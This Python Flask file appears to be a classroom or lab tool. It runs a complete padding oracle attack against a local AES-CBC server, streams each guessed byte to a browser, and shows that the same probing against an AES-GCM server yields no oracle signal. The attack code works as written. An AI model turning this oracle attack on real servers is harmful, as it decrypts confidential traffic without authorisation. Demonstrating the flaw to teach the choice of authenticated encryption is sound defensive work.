"""
attack_visualizer.py — Phase 2 attack visualizer.
Runs on port 5002.

Sections:
  ⚔  Attack AES-CBC Server  (port 5000) — padding oracle, already implemented
  🛡  Attack AES-GCM Server  (port 5001) — proves the attack fails

Run:
    cd phase2
    python attack_visualizer.py
Then open: http://127.0.0.1:5002
"""

import json, time, threading, queue, requests, os
from flask import Flask, render_template, request, jsonify, Response, stream_with_context

app   = Flask(__name__)
BLOCK = 16
CBC        = os.environ.get("CBC_URL", "http://127.0.0.1:5000")
GCM        = os.environ.get("GCM_URL", "http://127.0.0.1:5001")
STATS_FILE = os.environ.get("STATS_FILE", "../phase4/attack_stats.json")

_state = {
    "running": False,
    "stop":    False,
    "queue":   queue.Queue(),
}


# ── CBC Oracle ────────────────────────────────────────────────────────────────

def oracle(iv: bytes, ct: bytes) -> tuple[bool, int]:
    r = requests.post(f"{CBC}/decrypt",
                      json={"iv": iv.hex(), "ciphertext": ct.hex()},
                      timeout=5)
    return r.status_code == 200, r.status_code


# ── CBC Attack core ───────────────────────────────────────────────────────────

def run_attack(iv: bytes, ct: bytes, target_pt: str):
    st   = _state
    q    = st["queue"]
    emit = lambda obj: q.put(obj)

    num_blocks = len(ct) // BLOCK
    emit({"type": "start", "target": target_pt,
          "iv": iv.hex(), "ct": ct.hex(),
          "blocks": num_blocks,
          "total_bytes": num_blocks * BLOCK})

    ct_blocks = [ct[i:i+BLOCK] for i in range(0, len(ct), BLOCK)]
    all_inter = [bytearray(BLOCK) for _ in range(num_blocks)]
    all_plain = [bytearray(BLOCK) for _ in range(num_blocks)]
    per_byte  = []
    total_q   = 0
    t0        = time.time()

    for blk_num, curr_block in enumerate(ct_blocks):
        prev_block   = iv if blk_num == 0 else ct_blocks[blk_num - 1]
        intermediate = all_inter[blk_num]
        plaintext    = all_plain[blk_num]

        emit({"type": "block_start", "block": blk_num, "total_blocks": num_blocks})

        for byte_idx in range(BLOCK - 1, -1, -1):
            if st["stop"]:
                emit({"type": "stopped"}); return

            pad_val    = BLOCK - byte_idx
            q_before   = total_q
            found      = False
            global_idx = blk_num * BLOCK + byte_idx

            emit({"type": "byte_start", "byte_idx": byte_idx,
                  "global_idx": global_idx, "block": blk_num,
                  "pad_val": pad_val})

            for guess in range(256):
                if st["stop"]:
                    emit({"type": "stopped"}); return

                crafted = bytearray(BLOCK)
                for k in range(byte_idx + 1, BLOCK):
                    crafted[k] = intermediate[k] ^ pad_val
                crafted[byte_idx] = guess

                valid, code = oracle(bytes(crafted), curr_block)
                total_q += 1

                emit({"type": "query", "byte_idx": byte_idx,
                      "global_idx": global_idx, "block": blk_num,
                      "guess": guess, "guess_hex": f"{guess:02x}",
                      "code": code, "valid": valid, "total_q": total_q})

                if valid:
                    ok = True
                    if byte_idx > 0:
                        verify = bytearray(crafted)
                        verify[byte_idx - 1] ^= 0x01
                        v2, _ = oracle(bytes(verify), curr_block)
                        total_q += 1
                        emit({"type": "verify", "byte_idx": byte_idx,
                              "global_idx": global_idx,
                              "result": v2, "total_q": total_q})
                        if not v2:
                            ok = False

                    if ok:
                        intermediate[byte_idx] = guess ^ pad_val
                        plaintext[byte_idx]    = intermediate[byte_idx] ^ prev_block[byte_idx]
                        ch     = chr(plaintext[byte_idx]) if 32 <= plaintext[byte_idx] < 127 else "."
                        q_used = total_q - q_before
                        per_byte.append(q_used)

                        so_far = ""
                        for b in range(blk_num):
                            so_far += "".join(chr(x) if 32<=x<127 else "." for x in all_plain[b])
                        so_far += "".join(chr(x) if 32<=x<127 else "." for x in reversed(plaintext[byte_idx:]))

                        emit({"type": "byte_found",
                              "byte_idx": byte_idx, "global_idx": global_idx,
                              "block": blk_num, "guess": guess,
                              "guess_hex": f"{guess:02x}",
                              "intermediate": intermediate[byte_idx],
                              "inter_hex": f"{intermediate[byte_idx]:02x}",
                              "plain_val": plaintext[byte_idx],
                              "plain_hex": f"{plaintext[byte_idx]:02x}",
                              "plain_char": ch,
                              "iv_byte": prev_block[byte_idx],
                              "iv_hex": f"{prev_block[byte_idx]:02x}",
                              "pad_val": pad_val, "queries_used": q_used,
                              "total_q": total_q, "recovered_so_far": so_far})
                        found = True
                        break

            if not found:
                per_byte.append(total_q - q_before)
                emit({"type": "byte_failed", "byte_idx": byte_idx, "global_idx": global_idx})

    all_bytes = b"".join(bytes(p) for p in all_plain)
    pad_len   = all_bytes[-1] if 1 <= all_bytes[-1] <= BLOCK else 0
    recovered = all_bytes[:-pad_len] if pad_len else all_bytes
    rec_str   = "".join(chr(b) if 32<=b<127 else "." for b in recovered)
    elapsed   = round(time.time() - t0, 2)

    os.makedirs(os.path.dirname(os.path.abspath(STATS_FILE)), exist_ok=True)
    with open(STATS_FILE, "w") as f:
        json.dump({"target": target_pt, "recovered": rec_str,
                   "total_queries": total_q, "per_byte": per_byte}, f, indent=2)

    emit({"type": "done", "recovered": rec_str, "total_q": total_q,
          "elapsed": elapsed, "per_byte": per_byte,
          "avg": round(total_q / max(len(per_byte), 1), 1),
          "max_q": max(per_byte), "min_q": min(per_byte),
          "match": rec_str == target_pt})
    st["running"] = False


# ── Main UI route ─────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("visualizer.html")


# ── CBC attack routes ─────────────────────────────────────────────────────────

@app.route("/start", methods=["POST"])
def start():
    if _state["running"]:
        return jsonify({"error": "Attack already running"}), 400
    body = request.get_json(silent=True)
    pt   = (body or {}).get("plaintext", "").strip()
    if not pt:
        return jsonify({"error": "Plaintext cannot be empty"}), 400
    try:
        r = requests.post(f"{CBC}/encrypt", json={"plaintext": pt}, timeout=5)
        if r.status_code != 200:
            return jsonify({"error": "CBC server error"}), 500
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "CBC server not reachable. Start phase1/server.py first."}), 503
    data = r.json()
    iv   = bytes.fromhex(data["iv"])
    ct   = bytes.fromhex(data["ciphertext"])
    while not _state["queue"].empty():
        _state["queue"].get_nowait()
    _state["running"] = True
    _state["stop"]    = False
    num_blocks = len(ct) // BLOCK
    threading.Thread(target=run_attack, args=(iv, ct, pt), daemon=True).start()
    return jsonify({"ok": True, "iv": data["iv"], "ct": data["ciphertext"],
                    "pt_len": len(pt), "num_blocks": num_blocks,
                    "total_bytes": num_blocks * BLOCK})


@app.route("/stop", methods=["POST"])
def stop():
    _state["stop"] = True
    return jsonify({"ok": True})


@app.route("/stream")
def stream():
    def generate():
        yield "data: {\"type\":\"connected\"}\n\n"
        while True:
            try:
                event = _state["queue"].get(timeout=30)
                yield f"data: {json.dumps(event)}\n\n"
                if event.get("type") in ("done", "stopped"):
                    break
            except queue.Empty:
                yield "data: {\"type\":\"ping\"}\n\n"
    return Response(stream_with_context(generate()),
                    mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# ── CBC proxy routes (Attacker Tool tab) ──────────────────────────────────────

@app.route("/proxy/encrypt", methods=["POST"])
def proxy_encrypt():
    body = request.get_json(silent=True) or {}
    try:
        r = requests.post(f"{CBC}/encrypt", json=body, timeout=5)
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "CBC server not reachable on port 5000"}), 503


@app.route("/proxy/decrypt", methods=["POST"])
def proxy_decrypt():
    body = request.get_json(silent=True) or {}
    try:
        r = requests.post(f"{CBC}/decrypt", json=body, timeout=5)
        try:
            resp_body = r.json()
        except Exception:
            resp_body = {"raw": r.text}
        return jsonify(resp_body), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "CBC server not reachable on port 5000"}), 503


# ── GCM proxy routes (GCM Attack tab) ────────────────────────────────────────

@app.route("/proxy/gcm/encrypt", methods=["POST"])
def proxy_gcm_encrypt():
    """Proxy encrypt to GCM server — get a real ciphertext to attack."""
    body = request.get_json(silent=True) or {}
    try:
        r = requests.post(f"{GCM}/encrypt", json=body, timeout=5)
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "GCM server not reachable. Start phase3/server.py first."}), 503


@app.route("/proxy/gcm/decrypt", methods=["POST"])
def proxy_gcm_decrypt():
    """Proxy a single tampered decrypt attempt to the GCM server.
    Preserves the exact status code so the JS can read the oracle response.
    """
    body = request.get_json(silent=True) or {}
    try:
        r = requests.post(f"{GCM}/decrypt", json=body, timeout=5)
        try:
            resp_body = r.json()
        except Exception:
            resp_body = {"raw": r.text}
        return jsonify(resp_body), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "GCM server not reachable on port 5001"}), 503


@app.route("/proxy/gcm/probe", methods=["POST"])
def proxy_gcm_probe():
    """
    Run the full 256-guess oracle probe against the GCM server server-side.
    Sends 256 tampered decrypt requests and returns all results at once.
    This avoids 256 individual browser→server→GCM round trips.
    """
    body = request.get_json(silent=True) or {}
    ct   = body.get("ciphertext", "")
    tag  = body.get("tag", "")
    if not ct or not tag:
        return jsonify({"error": "ciphertext and tag required"}), 400

    results = []
    codes   = set()
    t0      = time.time()

    for guess in range(256):
        # Craft a tampered nonce with the guess byte at position 0
        crafted_nonce = format(guess, "02x") + "0" * 22   # 24 hex chars = 12 bytes
        # Also flip a byte in the ciphertext to ensure tag mismatch
        if len(ct) >= 2:
            last = int(ct[-2:], 16)
            tampered_ct = ct[:-2] + format((last ^ guess ^ 0xff) & 0xff, "02x")
        else:
            tampered_ct = ct

        try:
            r = requests.post(f"{GCM}/decrypt", json={
                "nonce":      crafted_nonce,
                "ciphertext": tampered_ct,
                "tag":        tag
            }, timeout=5)
            codes.add(r.status_code)
            results.append({"guess": guess, "code": r.status_code})
        except Exception as e:
            results.append({"guess": guess, "code": 0, "error": str(e)})

    elapsed = round(time.time() - t0, 2)
    unique  = len(codes)

    return jsonify({
        "total":        256,
        "results":      results,
        "codes_seen":   list(codes),
        "unique_codes": unique,
        "elapsed":      elapsed,
        "oracle_signal": unique > 1,
        "verdict": "SAFE — all responses identical, no oracle signal"
                   if unique == 1 else "VULNERABLE — different responses detected"
    })


if __name__ == "__main__":
    print("[*] Phase 2 attack visualizer running at http://127.0.0.1:5002")
    print("[*] CBC server expected on port 5000 (phase1/server.py)")
    print("[*] GCM server expected on port 5001 (phase3/server.py)")
    app.run(host="0.0.0.0", port=5002, debug=False, threaded=True)